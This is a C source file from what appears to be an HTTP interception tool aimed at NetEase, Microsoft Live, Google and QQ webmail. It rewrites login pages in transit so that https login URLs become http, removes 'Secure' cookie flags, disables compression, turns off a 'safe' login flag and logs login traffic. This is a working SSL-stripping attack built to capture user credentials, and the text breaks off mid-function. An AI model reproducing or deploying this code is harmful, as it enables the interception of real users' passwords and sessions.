
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#include "dataProcessorB.h"
#include "opsRegister.h"
#include "maskFlags.h"
#include "Analyzer_log.h"

extern int pubHeadOpsNum;
extern headFunc* pubHeadOps;

int getContentType(void* dat,int len,int status){
	if(!(status&DATA_HDR_COMPLET))
		return 0;
	if(status&CONTENT_T_MSK)
		return 0;
	if(!(status&DATA_T_REPLY))
		return 0;
	char* data=(char*)dat;
	char t=data[len];
	int rt=0;
	data[len]=0;
	char* contentT=strstr(data,"Content-Type: ");
	if(contentT){
		char* tmp=contentT+14;
		if(tmp+4<data+len && !memcmp(tmp,"image",5))
			rt=CONT_T_IMG;
		else if(tmp+21 <data+len && !memcmp(tmp,"application/javascript",22)){
			rt=CONT_T_JS;
		}
		else if(tmp+28 <data+len && !memcmp(tmp,"application/x-shockwave-flash",29)){
			rt=CONT_T_FLASH;
		}
		else if(tmp+3<data+len && !memcmp(tmp,"text",4)){
			rt=CONT_T_TXT;
		}	
	}
	data[len]=t;
	return rt;
}

int getTransferencode(void* dat,int len,int status){
	if(!(status&DATA_HDR_COMPLET))
		return 0;
	if(!(status&(DATA_T_POST|DATA_T_REPLY)))
		return 0;
	if(status&TRANS_ENCOD_MSK)
		return 0;
	char* data=(char*)dat;
	int rt=0;
	char t=data[len];
	data[len]=0;
	char* transaddr=NULL;
	transaddr=strstr(data,"Content-Length: ");
	if(transaddr){
		rt=TRANS_ENCOD_COMM;
		transaddr=strstr(data,"Content-Encoding: gzip");
		if(transaddr){
			rt=TRANS_ENCOD_ECOMM;
			//printf("GZIP ENCODING: \n%s\n",data);
		}
	}	
	else if((transaddr=strstr(data,"Transfer-Encoding: chunked")))
		rt=TRANS_ENCOD_CHUNK;
	data[len]=t;
	return rt;
}

int isHeadComplete(void* dat,int len,int status){
	if(status&DATA_HDR_COMPLET)
		return 0;
	char* data=(char*)dat;
	char t=data[len];
	data[len]=0;
	int rt=0;
	if(strstr(data,"\r\n\r\n"))
		rt=DATA_HDR_COMPLET;
	data[len]=t;		
	return rt;
}

int getDataType(void* dat,int len,int status){
	if(status&DATA_T_MSK)
		return 0;
	char* data=(char*)dat;
	if(!memcmp(data,"GET ",4))
		return DATA_T_GET;
	else if(!memcmp(data,"POST",4))
		return DATA_T_POST;
	else if(!memcmp(data,"HTTP",4)){
	/*	char* data=(char*)dat;
		char t=data[len];
		data[len]=0;
		char* pattern2="Keep-Alive: ";
		char* addr=strstr(data,pattern2);
		if(addr){
			addr+=12;
			*addr=0x30;
			addr++;
			while(*addr !='\r'){
				*addr=' ';
				addr++;
			}
		}
		char* pattern3="Connection: ";
		addr=strstr(data,pattern3);
		if(addr){
			addr+=12;
			memcpy(addr,"close     ",10);
		}
		data[len]=t;*/
		return DATA_T_REPLY;
	}
	return 0;
}

int getContentLen(char* data,int len,int status){
	if(status&DATA_T_GET)
		return 0;
	if(status&TRANS_ENCOD_CHUNK)
		return 0;
	if(status&TRANS_ENCOD_MSK){
		char t=data[len];
		data[len]=0;
		int rt=0;
		char* conLen=strstr(data,"Content-Length: ");
		if(conLen){
			char buf[32];
			memcpy(buf,conLen,32);
			//buf[31]=0;
			//printf("......get content leng: %s\n",buf);
			conLen+=14;
			rt=atoi(conLen);
		}
		data[len]=t;
		return rt;
	}
	return 0;
}

int rhWangyiEncode(void* data,int len){
	int rt=0;
	char* dat=(char*)data;
	char t=dat[len];
	dat[len]=0;
	char* pattern="Accept-Encoding: ";
	char* replace="Accept-Encoding: \r\n                                                                           ";
	char* addr=strstr(dat,pattern);
	if(addr){
		int i;
		char* end=addr;
		while(end < dat+len && *end!='\n')
			end++;
		if(*end=='\n'){
			end++;
			i=end-addr;
			while(end<data+len){
				*addr=*end;
				end++;
				addr++;		
			}
			//因为mail.yeah.net域名gzip格式消不掉
			if(strstr(dat,"GET / HTTP/1.1\r\n")&&strstr(dat,"Host: mail.yeah.net\r\n"))
			{
				char* p = strstr(dat,"Host: mail.yeah.net\r\n");
				p+=6;
				memcpy(p," www",4);
			}
			return i;
		}		
	}	
	
	/*
	if(addr){
		int i=0;
		while(addr[i]!='\n')
			i++;
		i++;
		memcpy(addr,replace,i);	
	}
	*/
	/*
	if(addr){//printf("Accept-Encoding: gzip\n%s\n",data);
		addr+=strlen(pattern);
		memcpy(addr,"none",4);
		addr+=4;
		while(addr< dat+len && *addr++!='\r')
			*(addr-1)=' ';
		if(*addr=='\n')
			rt=1;		//printf("dat = %s\n",dat);
	}
	*/
	dat[len]=t;
	return 0;
}



int rc126LoginUrl(void* data,int len){
	int rt=0;
	char* dat=(char*)data;
	char* pattern="\"sSslAction\" : \"https://ssl.mail.126.com/entry/cgi/ntesdoor?\",";
	int   plen=strlen(pattern);
	char* replace="\"sSslAction\" : \"http://entry.mail.126.com/cgi/ntesdoor?\",       ";
	char* addr=dat;
	while((addr=strstr(addr,pattern))){
		memcpy(addr,replace,plen);
		rt++;
		addr+=plen;
	}
	return rt<<24;
}

int rcyeahLoginUrl(void* data,int len){
	int rt=0;
	char* dat=(char*)data;
	char* pattern="\"sSslAction\" : \"https://mail.yeah.net/entry/cgi/ntesdoor?\",";
	int   plen=strlen(pattern);
	char* replace="\"sSslAction\" : \"http://mail.yeah.net/entry/cgi/ntesdoor?\", ";
	char* addr=dat;
	while((addr=strstr(addr,pattern))){
		memcpy(addr,replace,plen);
		rt++;
		addr+=plen;
	}
	return rt<<24;
}

int rc163LoginUrl(void* data,int len){
	int rt=0;
	char* dat=(char*)data;
	char* pattern="\"sSslUrl\" : \"https://ssl.mail.163.com/entry/coremail/fcg/ntesdoor2?\",";
	char* replace="\"sSslUrl\" : \"http://entry.mail.163.com/coremail/fcg/ntesdoor2?\",       ";
	int   plen=strlen(pattern);
	char* pattern2="\"sSslUrl\" : \"https://ssl.mail.126.com/entry/cgi/ntesdoor?\","; 
	char* replace2="\"sSslUrl\" : \"http://entry.mail.126.com/cgi/ntesdoor?\",       ";
	int   plen2=strlen(pattern2);
	char* pattern3="\"sSslUrl\" : \"https://ssl.mail.yeah.net/entry/cgi/ntesdoor?\",";
	char* replace3="\"sSslUrl\" : \"http://entry.mail.yeah.net/cgi/ntesdoor?\",       ";
	int plen3=strlen(pattern3);

	char* addr=dat;
	while((addr=strstr(addr,pattern))){
		memcpy(addr,replace,plen);
		rt++;
		addr+=plen;
	}
	addr=dat;
	while((addr=strstr(addr,pattern2))){
		memcpy(addr,replace2,plen2);
		rt++;
		addr+=plen2;
	}
	addr=dat;
	while((addr=strstr(addr,pattern3))){
		memcpy(addr,replace3,plen3);
		rt++;
		addr+=plen2;
	}
	
	return rt<<24;
}



int rcWangyiLoginUrl(void* data,int len){
	int rt=0;
	char* dat=(char*)data;
	char* pattern="https://reg.163.com/logins.jsp";
	char* addr=dat;
	while((addr=strstr(addr,pattern))){
		memcpy(addr," http",5);
		rt++;
	}
	return rt<<24;
}


int rcWangyiLoginUrl2(void* data,int len){
	int rt=0;
	char* dat=(char*)data;
	char* pattern="https://ssl.mail.yeah.net";
	char* addr=dat;
	while((addr=strstr(addr,pattern))){
		memcpy(addr," http",5);
		rt++;
	}
	return rt<<24;
}

int rcWangyiLoginUrl3(void* data,int len){
	int rt=0;
	char* dat=(char*)data;
	char* pattern= "https://ssl.mail.163.com";
	char* rpattern=" http://ssl.mail.163.com";
	char* addr=dat;
	while((addr=strstr(addr,pattern))){
		memcpy(addr,rpattern,strlen(pattern));
		rt++;
	}
	return rt<<24;
}

int rcWangyiLoginUrl4(void* data,int len){
	int rt=0;
	char* dat=(char*)data;
	char* pattern= "https://ssl.mail.126.com";
	char* rpattern=" http://ssl.mail.126.com";
	char* addr=dat;
	while((addr=strstr(addr,pattern))){
		memcpy(addr,rpattern,strlen(pattern));
		rt++;
	}
	return rt<<24;
}

int rcWangyiLoginUrl5(void* data,int len){
	int rt=0;
	char* dat=(char*)data;
	char* pattern="\"https://reg.163.com/logins.jsp";
	char* addr=dat;
	while((addr=strstr(addr,pattern))){
		memcpy(addr," \"http",6);
		rt++;
	}
	return rt<<24;
}

int rcWangyiLoginType(void* data,int len){
	int rt=0;
	char* dat=(char*)data;
	char* pattern="sLoginFunc = 'ssl'";
	char*   reply="sLoginFunc= 'http'";
	char* addr=dat;
	while((addr=strstr(addr,pattern))){
		memcpy(addr,reply,strlen(reply));
		rt++;
	}
	return rt<<24;
}

int rcWangyiLoginSafe(void* data,int len){
	int rt=0;
	char* dat=(char*)data;
	char* pattern="gUserInfo.safe = 1";
	char*   reply="gUserInfo.safe = 0";
	char* addr=dat;
	while((addr=strstr(addr,pattern))){
		memcpy(addr,reply,strlen(reply));
		rt++;
	}
	return rt<<24;
}


int s163login(void* data,int len){
	int rt=0;
	char* dat=(char*)data;
	char* pattern[3]={"\"sSslUrl\" : \"https://ssl.mail.163.com/entry/coremail/fcg/ntesdoor2?\",",
					  "\"sSslUrl\" : \"https://ssl.mail.126.com/entry/cgi/ntesdoor?\",",
					  "\"sSslUrl\" : \"https://ssl.mail.yeah.net/entry/cgi/ntesdoor?\","};

	int i;
	int j=0;
	int plen; 
	char* start=dat+len-plen+1;
	while(j<3){
		plen=strlen(pattern[j]);
		i=0;
		start=dat+len-plen+1;
		while(start<dat+len){
			if(*start==pattern[j][i]){
				start++;
				i++;
			}
			else{
				start++;
				i=0;
			}
		}
		if(i)
			return i;
		j++;	
	}
	return 0;
}

int sWangyi(void* data,int len){
	int rt=0;
	char* dat=(char*)data;
	char* pattern="https://reg.163.com/logins.jsp";
	int plen=strlen(pattern);
	char* start=dat+len-plen+1;
	int i=0;
	while(start<dat+len){
		if(*start==pattern[i]){
			start++;
			i++;
		}
		else{
			start++;
			i=0;
		}
	}
	rt=i;
	return rt;
}

int sWangyi2(void* data,int len){
	int rt=0;
	char* dat=(char*)data;
	char* pattern="https://ssl.mail.yeah.net";
	int plen=strlen(pattern);
	char* start=dat+len-plen+1;
	int i=0;
	while(start<dat+len){
		if(*start==pattern[i]){
			start++;
			i++;
		}
		else{
			start++;
			i=0;
		}
	}
	rt=i;
	return rt;
}

int sWangyi3(void* data,int len){
	int rt=0;
	char* dat=(char*)data;
	char* pattern="https://ssl.mail.163.com";
	int plen=strlen(pattern);
	char* start=dat+len-plen+1;
	int i=0;
	while(start<dat+len){
		if(*start==pattern[i]){
			start++;
			i++;
		}
		else{
			start++;
			i=0;
		}
	}
	rt=i;
	return rt;
}

int sWangyi4(void* data,int len){
	int rt=0;
	char* dat=(char*)data;
	char* pattern="https://ssl.mail.126.com";
	int plen=strlen(pattern);
	char* start=dat+len-plen+1;
	int i=0;
	while(start<dat+len){
		if(*start==pattern[i]){
			start++;
			i++;
		}
		else{
			start++;
			i=0;
		}
	}
	rt=i;
	return rt;
}

int sWangyi5(void* data,int len){
	int rt=0;
	char* dat=(char*)data;
	char* pattern="\"https://reg.163.com/logins.jsp";
	int plen=strlen(pattern);
	char* start=dat+len-plen+1;
	int i=0;
	while(start<dat+len){
		if(*start==pattern[i]){
			start++;
			i++;
		}
		else{
			start++;
			i=0;
		}
	}
	rt=i;
	return rt;
}

int sWangyiLoginType(void* data,int len){
	int rt=0;
	char* dat=(char*)data;
	char* pattern="sLoginFunc = 'ssl'";
	int plen=strlen(pattern);
	char* start=dat+len-plen+1;
	int i=0;
	while(start<dat+len){
		if(*start==pattern[i]){
			start++;
			i++;
		}
		else{
			start++;
			i=0;
		}
	}
	rt=i;
	return rt;
}

int sWangyiLoginSafe(void* data,int len){
	int rt=0;
	char* dat=(char*)data;
	char* pattern="gUserInfo.safe = 1";
	int plen=strlen(pattern);
	char* start=dat+len-plen+1;
	int i=0;
	while(start<dat+len){
		if(*start==pattern[i]){
			start++;
			i++;
		}
		else{
			start++;
			i=0;
		}
	}
	rt=i;
	return rt;
}

struct DataOperation* getWangyiOps(){
	struct DataOperation* ops=(struct DataOperation*)malloc(sizeof(struct DataOperation));
	if(ops){
		memset(ops,0,sizeof(*ops));
		
		ops->hnum=pubHeadOpsNum;
		ops->hOps=pubHeadOps;
		
		ops->rhnum=1;
		ops->rhOps=(replaceHeadFunc*)malloc(sizeof(replaceHeadFunc)*ops->rhnum);
		if(ops->rhOps)
			ops->rhOps[0]=rhWangyiEncode;
		else
			ops->rhnum=0;
		
		ops->rcnum=8;
		ops->rcOps=(replaceContentFunc*)malloc(sizeof(replaceContentFunc)*ops->rcnum);
		if(ops->rcOps){
			ops->rcOps[0]=rc126LoginUrl;
			ops->rcOps[1]=rc163LoginUrl;	
			ops->rcOps[2]=rcWangyiLoginUrl;
			ops->rcOps[3]=rcWangyiLoginUrl2;
			//ops->rcOps[2]=rcWangyiLoginType;
			//ops->rcOps[3]=rcWangyiLoginSafe;
			ops->rcOps[4]=rcWangyiLoginUrl3;
			ops->rcOps[5]=rcWangyiLoginUrl4;
			ops->rcOps[6]=rcWangyiLoginUrl5;
			ops->rcOps[7]=rcyeahLoginUrl;
		}
		else
			ops->rcnum=0;
		
		ops->snum=6;
		ops->sOps=(splitFunc*)malloc(sizeof(splitFunc)*ops->snum);
		if(ops->sOps){
			ops->sOps[0]=s163login;
			ops->sOps[1]=sWangyi;
			ops->sOps[2]=sWangyi2;
			//ops->sOps[2]=sWangyiLoginType;
			//ops->sOps[3]=sWangyiLoginSafe;
			ops->sOps[3]=sWangyi3;
			ops->sOps[4]=sWangyi4;
			ops->sOps[5]=sWangyi5;
		}
		else
			ops->snum=0;
		
		return ops;
	}
	return 0;
}

//msn
int rhMsnEncode(void* data,int len){
	return rhWangyiEncode(data,len);
}

int rhMsnLocation(void* data,int len){
	char* dat=(char*)data;
	char t=dat[len];
	dat[len]=0;
	int rt=0;
	char* pattern="Location: https://login.live.com/login.srf";
	char* locaddr=strstr(dat,pattern);
	if(locaddr){
		memcpy(locaddr,"Location:  http",15);
		rt=1;
	}
	dat[len]=t;
	return 0;
}

int rcMsnLogin(void* data,int len){
	char* dat=(char*)data;
	char t=dat[len];
	dat[len]=0;
	int rt=0;
	char* pattern="https://login.live.com";
	char* logaddr=dat;
	while((logaddr=strstr(logaddr,pattern))){
		memcpy(logaddr," http",5);
		rt++;
	}
	dat[len]=t;
	return rt;
}

int rcMsnLoginB(void* data,int len){
	char* dat=(char*)data;
	char t=dat[len];
	dat[len]=0;
	int rt=0;
	char* pattern="https://mail.live.com";
	char* logaddr=dat;
	while((logaddr=strstr(logaddr,pattern))){
		memcpy(logaddr," http",5);
		rt++;
	}
	dat[len]=t;
	return rt;
}

int rcMsnLoginC(void* data,int len){
	char* dat=(char*)data;
	char t=dat[len];
	dat[len]=0;
	int rt=0;
	//char* pattern="<noscript><meta http-equiv=\"Refresh\" content=\"0; URL= http://login.live.com/jsDisabled.srf?mkt=ZH-CN&lc=2052\"/>";
	char* pattern="<script type=\"text/javascript\" src=\"Https://secure.shared.live.com/~Live.SiteContent.ID/~17.0.10/~/~/~/~/js/Login_Core.js\"></script>";
	char* logaddr=dat;
	while(logaddr=strstr(logaddr,pattern)){
	memcpy(logaddr, "                                                                                                                                    ",132);
		//memcpy(logaddr,"                                                                                                                                                                                                                                                                                                                                                         ",345);
		rt++;
	}
	dat[len]=t;
	return rt;
}

int rcMsnLoginD(void* data,int len){
	char* dat=(char*)data;
	char t=dat[len];
	dat[len]=0;
	int rt=0;
	char* pattern="</noscript><title>";
	char* logaddr=dat;
	while(logaddr=strstr(logaddr,pattern)){
		memcpy(logaddr,"           ",11);
		rt++;
	}
	dat[len]=t;
	return rt;
}

int sMsn(void* data,int len){
	char* dat=(char*)data;
	char* pattern="https://login.live.com";
	int plen=strlen(pattern);
	char* caddr=dat+len-plen+1;
	int i=0;
	int rt=0;
	while(caddr<dat+len){
		if(*caddr==pattern[i])
			i++;
		else
			i=0;
		caddr++;
	}
	rt=i;
	return rt;
}

int sMsnB(void* data,int len){
	char* dat=(char*)data;
	char* pattern="https://mail.live.com";
	int plen=strlen(pattern);
	char* caddr=dat+len-plen+1;
	int i=0;
	int rt=0;
	while(caddr<dat+len){
		if(*caddr==pattern[i])
			i++;
		else
			i=0;
		caddr++;
	}
	rt=i;
	return rt;
}

int sMsnC(void* data,int len){
	char* dat=(char*)data;
	char* pattern="<script type=\"text/javascript\" src=\"Https://secure.shared.live.com/~Live.SiteContent.ID/~17.0.10/~/~/~/~/js/Login_Core.js\"></script>";
	int plen=strlen(pattern);
	char* caddr=dat+len-plen+1;
	int i=0;
	int rt=0;
	while(caddr<dat+len){
		if(*caddr==pattern[i])
			i++;
		else
			i=0;
		caddr++;
	}
	rt=i;
	return rt;
}

int sMsnD(void* data,int len){
	char* dat=(char*)data;
	char* pattern="</noscript><title>";
	int plen=strlen(pattern);
	char* caddr=dat+len-plen+1;
	int i=0;
	int rt=0;
	while(caddr<dat+len){
		if(*caddr==pattern[i])
			i++;
		else
			i=0;
		caddr++;
	}
	rt=i;
	return rt;
}

struct DataOperation* getMsnOps(){

	struct DataOperation* ops=(struct DataOperation*)malloc(sizeof(struct DataOperation));
	if(ops){
		memset(ops,0,sizeof(*ops));
		
		ops->hnum=pubHeadOpsNum;
		ops->hOps=pubHeadOps;
		
		ops->rhnum=2;
		ops->rhOps=(replaceHeadFunc*)malloc(sizeof(replaceHeadFunc)*ops->rhnum);
		if(ops->rhOps){
			ops->rhOps[0]=rhMsnEncode;
			ops->rhOps[1]=rhMsnLocation;
			
		}
		else
			ops->rhnum=0;
		
		ops->rcnum=3;
		ops->rcOps=(replaceContentFunc*)malloc(sizeof(replaceContentFunc)*ops->rcnum);
		if(ops->rcOps){
			ops->rcOps[0]=rcMsnLogin;
			ops->rcOps[1]=rcMsnLoginB;
			ops->rcOps[2]=rcMsnLoginC;
		}
		else
			ops->rcnum=0;
		
		ops->snum=3;
		ops->sOps=(splitFunc*)malloc(sizeof(splitFunc)*ops->snum);
		if(ops->sOps){
			ops->sOps[0]=sMsn;
			ops->sOps[1]=sMsnB;
			ops->sOps[2]=sMsnC;
		}
		else
			ops->snum=0;		
		return ops;
	}
	return 0;
}

//google
int rhGugoSecure(void* data,int len){
	char* dat=(char*)data;
	char t=dat[len];
	dat[len]=0;
	char* pattern="Secure";
	char* saddr=dat;
	int rt=0;
	while((saddr=strstr(saddr,pattern))){
		memcpy(saddr,"      ",6);
		rt++;
	}
	dat[len]=t;
	return 0;
}

int rhGugoEncode(void* data,int len){//if(strstr(data,"GET /")){printf("\n%s",data);}
	return rhWangyiEncode(data,len);
	/*char* dat=(char*)data;
	char t=dat[len];
	dat[len]=0;
	int rt=0;
	char* pattern="Accept-Encoding: gzip";
	char* locaddr=strstr(dat,pattern);
	if(locaddr){printf("Accept-Encoding: gzip");
		memcpy(locaddr,"Accept-Encoding: none",22);
		rt++;
	}
	dat[len]=t;
	return rt;*/
}

int rhGugoLocationA2(void* data,int len){
/*
	char* dat=(char*)data;
	char t=dat[len];
	int rt=0;
	printf("BEFORE: %s\n",data);
	char* pattern="Location: ";
	char* locaddr=strstr(dat,pattern);
	if(locaddr){
		locaddr+=10;
		char* locend=strstr(locaddr,"\r\n");
		char* pattern2="https";
		char* tmp=locaddr;
		int i=0;
		int j=0;
		while((tmp=strstr(tmp,pattern2))&& tmp<locaddr){
			memcpy(tmp,"http ",5);
			i++;
		}
		j=i;
		char* index=locaddr;
		while(i>0 && locaddr<locend){
			if(*locaddr==' '){
				i++;
				locaddr++;
			}
			else{
			*index=*locaddr;
			locaddr++;
			index++;
			}	
		}
		if(j){
			memset(locend-j,' ',j);
		}	
	}
	printf("AFTER: %s\n",data);
	dat[len]=t;
	
	return rt;
*/
return 0;
}

int rhGugoLocationA(void* data,int len){
	char* dat=(char*)data;
	char t=dat[len];
	int rt=0;
	//printf("BEFORE: %s\n",data);
	char* pattern="Location: https://www.google.com";
	char* locaddr=strstr(dat,pattern);
	if(locaddr){
		memcpy(locaddr,"Location:  http",15);
		rt++;
	}
	dat[len]=t;
	return 0;
}

int rhGugoLocationB(void* data,int len){
	char* dat=(char*)data;
	char t=dat[len];
	dat[len]=0;
	int rt=0;
	char* pattern="Location: https://mail.google.com";
	char* locaddr=strstr(dat,pattern);
	if(locaddr){
		memcpy(locaddr,"Location:  http",15);
		rt++;
	}
	dat[len]=t;
	return 0;
}

int rhGugoLocationC(void* data,int len){
	char* dat=(char*)data;
	char t=dat[len];
	dat[len]=0;
	int rt=0;
	char* pattern="Location: https://accounts.google.com";
	char* locaddr=strstr(dat,pattern);
	if(locaddr){
		memcpy(locaddr,"Location:  http",15);
		rt++;
	}
	dat[len]=t;
	return 0;
}

int rhGugoUrlA(void* data,int len){
	char* dat=(char*)data;
	char t=dat[len];
	dat[len]=0;
	int rt=0;
	char* pattern="https://mail.google.com";
	char* locaddr=dat;
	locaddr=strstr(locaddr,pattern);
	while(locaddr){
		memcpy(locaddr," http",5);
		rt++;
		locaddr=strstr(locaddr,pattern);
	}
	dat[len]=t;
	return 0;
}

int rhGugoUrlB(void* data,int len){
	int rt=0;
/*
	char* dat=(char*)data;
	char t=dat[len];
	dat[len]=0;
	char* pattern="https://www.google.com";
	char* locaddr=dat;
	locaddr=strstr(locaddr,pattern);
	while(locaddr){
		memcpy(locaddr," http",5);
		rt++;
		locaddr=strstr(locaddr,pattern);
	}
	dat[len]=t;
*/
	return rt;
}

int rhGugoUrlC(void* data,int len){
	char* dat=(char*)data;
	char t=dat[len];
	dat[len]=0;
	int rt=0;
	char* pattern="GZ=Z=1";
	char* locaddr=strstr(dat,pattern);
	if(locaddr){
	memcpy(locaddr,"G=Z=0",6);
	rt++;
	}
	dat[len]=t;
	return 0;
}

int rcGugoUrlA(void* data,int len){
	char* dat=(char*)data;
	char t=dat[len];

if(strstr(dat,"GET /mail")){
	LOG_INFO("++++++++++++++++++++++++++\n%s\n+++++++++++++++++++++++\n",dat);
}
	dat[len]=0;
	int rt=0;
	char* uaddr=dat;
	char* pattern="https://mail.google.com";
	int plen=strlen(pattern);
	while((uaddr=strstr(uaddr,pattern))){
		if(uaddr-10 >dat && !memcmp(uaddr-10,"continue",8)){
			printf("NOT REPLACE CONTINUE .....\n");
			uaddr+=plen;
			continue;
		}
		memcpy(uaddr," http",5);
		uaddr+=plen;
		rt++;
	}
	dat[len]=t;
	return rt;
}

int rcGugoUrlB(void* data,int len){
	char* dat=(char*)data;
	char t=dat[len];
	dat[len]=0;
	int rt=0;
	char* uaddr=dat;
	char* pattern="https://www.google.com";
	int plen=strlen(pattern);
	while((uaddr=strstr(uaddr,pattern))){
		if(uaddr-10 > dat && !memcmp(uaddr-10,"continue",8)){
			printf("NOT REPLACE CONTINUE .....\n");
			uaddr+=plen;
			continue;
		}
		memcpy(uaddr," http",5);
		uaddr+=plen;
		rt++;
	}
///////////////////////
#define TEST_HTTPS_HEAD
#ifdef TEST_HTTPS_HEAD
	{
		char* addr3=strstr(dat,"Location: https");
		if(addr3)
			LOG_INFO("HEAD.......................: %s\n",dat);
		addr3=strstr(dat,"https://www.google.com");
		if(addr3)
			LOG_INFO("HEAD................ WWW URL: %s\n",dat);
	}
#endif
////////////////////////////////////
	dat[len]=t;
	return rt;
}

int rcGugoUrlC(void* data,int len){
	char* dat=(char*)data;
	char t=dat[len];
	dat[len]=0;
	int rt=0;
	char* uaddr=dat;
	char* pattern="https://accounts.google.com";
	int plen=strlen(pattern);
	while((uaddr=strstr(uaddr,pattern))){
		if(uaddr-10 >dat && !memcmp(uaddr-10,"continue",8)){
			printf("NOT REPLACE CONTINUE .....\n");
			uaddr+=plen;
			continue;
		}
		memcpy(uaddr," http",5);
		uaddr+=plen;
		rt++;
	}
	dat[len]=t;
	return rt;
}

int rcGugoUrlD(void* data,int len){
	char* dat=(char*)data;
	char t=dat[len];
	dat[len]=0;
	int rt=0;
	char* pattern="GZ=Z=1";
	char* locaddr=strstr(dat,pattern);
	if(locaddr){
	memcpy(locaddr,"G=Z=0",6);
	rt++;
	}
	dat[len]=t;
	return rt;
}

int rhGugoContinue(void* data,int len){
	char* dat=(char*)data;
	char t=dat[len];
	dat[len]=0;
	int rt=0;
	char* uaddr=dat;
	//if(!memcmp(uaddr,"HTTP/1.1 302",12))
	//	printf("************\n%s",uaddr);
		
	char* pattern="continue=%20http://www.google.com";
	int plen=strlen(pattern);
	while((uaddr=strstr(uaddr,pattern))){
		memcpy(uaddr,"continue=+https",15);
		uaddr+=plen;
		rt++;
	}
	if(rt)
	LOG_INFO(".........................REPLACE CONTINUE %d TIMES\n",rt);
	dat[len]=t;
	return 0;
}

int sGugoA(void* data,int len){
	char* dat=(char*)data;
	char* pattern="https://mail.google.com";
	int plen=strlen(pattern);
	int i=0;
	int rt=0;
	char* caddr=dat+len-plen+1;
	while(caddr<dat+len){
		if(*caddr==pattern[i])
			i++;
		else
			i=0;
		caddr++;
	}
	rt=i;
	return rt;
}

int sGugoB(void* data,int len){
	char* dat=(char*)data;
	char* pattern="https://www.google.com";
	int plen=strlen(pattern);
	int i=0;
	int rt=0;
	char* caddr=dat+len-plen+1;
	while(caddr<dat+len){
		if(*caddr==pattern[i])
			i++;
		else
			i=0;
		caddr++;
	}
	rt=i;
////////////////////////////////////////
	if(!memcmp(dat,"ServiceLoginAuth",15))
		LOG_INFO("***Content ****LoginAuth..............*****\n%s\n",dat);
////////////////////////////////////////	

	return rt;
}

int sGugoC(void* data,int len){
	char* dat=(char*)data;
	char* pattern="https://accounts.google.com";
	int plen=strlen(pattern);
	int i=0;
	int rt=0;
	char* caddr=dat+len-plen+1;
	while(caddr<dat+len){
		if(*caddr==pattern[i])
			i++;
		else
			i=0;
		caddr++;
	}
	rt=i;
	return rt;
}

int sGugoD(void* data,int len){
	char* dat=(char*)data;
	char t=dat[len];
	dat[len]=0;
	int rt=0;
	char* pattern="GZ=Z=1";
	char* locaddr=strstr(dat,pattern);
	if(locaddr){
	memcpy(locaddr,"G=Z=0",6);
	rt++;
	}
	dat[len]=t;
	return rt;

}

struct DataOperation* getGugoOps(){

	struct DataOperation* ops=(struct DataOperation*)malloc(sizeof(struct DataOperation));
	if(ops){
		memset(ops,0,sizeof(*ops));
		
		ops->hnum=pubHeadOpsNum;
		ops->hOps=pubHeadOps;
		
		ops->rhnum=10;
		ops->rhOps=(replaceHeadFunc*)malloc(sizeof(replaceHeadFunc)*ops->rhnum);
		if(ops->rhOps){
			ops->rhOps[0]=rhGugoEncode;
			ops->rhOps[1]=rhGugoSecure;
			ops->rhOps[2]=rhGugoLocationA2;
			ops->rhOps[3]=rhGugoLocationA;
			ops->rhOps[4]=rhGugoLocationB;
			ops->rhOps[5]=rhGugoLocationC;
			ops->rhOps[6]=rhGugoUrlA;	
			ops->rhOps[7]=rhGugoUrlB;
			ops->rhOps[8]=rhGugoContinue;	
			ops->rhOps[9]=rhGugoUrlC;
		}
		else
			ops->rhnum=0;
		
		ops->rcnum=4;
		ops->rcOps=(replaceContentFunc*)malloc(sizeof(replaceContentFunc)*ops->rcnum);
		if(ops->rcOps){
			ops->rcOps[0]=rcGugoUrlA;
			ops->rcOps[1]=rcGugoUrlB;
			ops->rcOps[2]=rcGugoUrlC;
			ops->rcOps[3]=rcGugoUrlD;
		}
		else
			ops->rcnum=0;
		
		ops->snum=4;
		ops->sOps=(splitFunc*)malloc(sizeof(splitFunc)*ops->snum);
		if(ops->sOps){
			ops->sOps[0]=sGugoA;
			ops->sOps[1]=sGugoB;
			ops->sOps[2]=sGugoC;
			ops->sOps[3]=sGugoD;
		}
		else
			ops->snum=0;		
		return ops;
	}
	return 0;
}

int rhQqEncode(void* data,int len){
	return rhWangyiEncode(data,len);
}

int rcQqUrl(void* data,int len){
	char* dat=data;
	char t=dat[len];
	dat[len]=0;
	int rt=0;
	char* uaddr=dat;
	char* pattern="https://mail.qq.com";
	while((uaddr=strstr(uaddr,pattern))){
		memcpy(uaddr," http",5);
		rt++;
	}
	dat[len]=t;
	return rt;
}

int rcQqSsl(void* data,int len){
	char* dat=data;
	char t=dat[len];
	dat[len]=0;
	int rt=0;
	char* uaddr=dat;
	char* pattern="\"ssl_edition=;";
	while((uaddr=strstr(uaddr,pattern))){
		memcpy(uaddr,"    ",4);
		rt++;
	}
	dat[len]=t;
	return rt;
}

int rcQqPwd(void* data,int len){
	char* dat=data;
	char t=dat[len];
	dat[len]=0;
	int rt=0;
	char* uaddr=dat;
	char* pattern="pwd.value = \"\";";
	while((uaddr=strstr(uaddr,pattern))){
		memcpy(uaddr,"               ",15);
		rt++;
	}
	dat[len]=t;
	return rt;
}

int sQqA(void* data,int len){
	char* dat=(char*)data;
	char* pattern="https://mail.qq.com";
	int plen=strlen(pattern);
	int i=0;
	int rt=0;
	char* caddr=dat+len-plen+1;
	while(caddr<dat+len){
		if(*caddr==pattern[i])
			i++;
		else
			i=0;
		caddr++;
	}
	rt=i;
	return rt;
}

int sQqB(void* data,int len){
	char* dat=(char*)data;
	char* pattern="\"ssl_edition=;";
	int plen=strlen(pattern);
	int i=0;
	int rt=0;
	char* caddr=dat+len-plen+1;
	while(caddr<dat+len){
		if(*caddr==pattern[i])
			i++;
		else
			i=0;
		caddr++;
	}
	rt=i;
	return rt;
}

int sQqC(void* data,int len){
	char* dat=(char*)data;
	char* pattern="pwd.value = \"\";";
	int plen=strlen(pattern);
	int i=0;
	int rt=0;
	char* caddr=dat+len-plen+1;
	while(caddr<dat+len){
		if(*caddr==pattern[i])
			i++;
		else
			i=0;
		caddr++;
	}
	rt=i;
	return rt;
}

struct DataOperation* getQqOps(){
	struct DataOperation* ops=(struct DataOperation*)malloc(sizeof(struct DataOperation));
	if(ops){
		memset(ops,0,sizeof(*ops));
		
		ops->hnum=pubHeadOpsNum;
		ops->hOps=pubHeadOps;
		
		ops->rhnum=1;
		ops->rhOps=(replaceHeadFunc*)malloc(sizeof(replaceHeadFunc)*ops->rhnum);
		if(ops->rhOps)
			ops->rhOps[0]=rhQqEncode;
		else
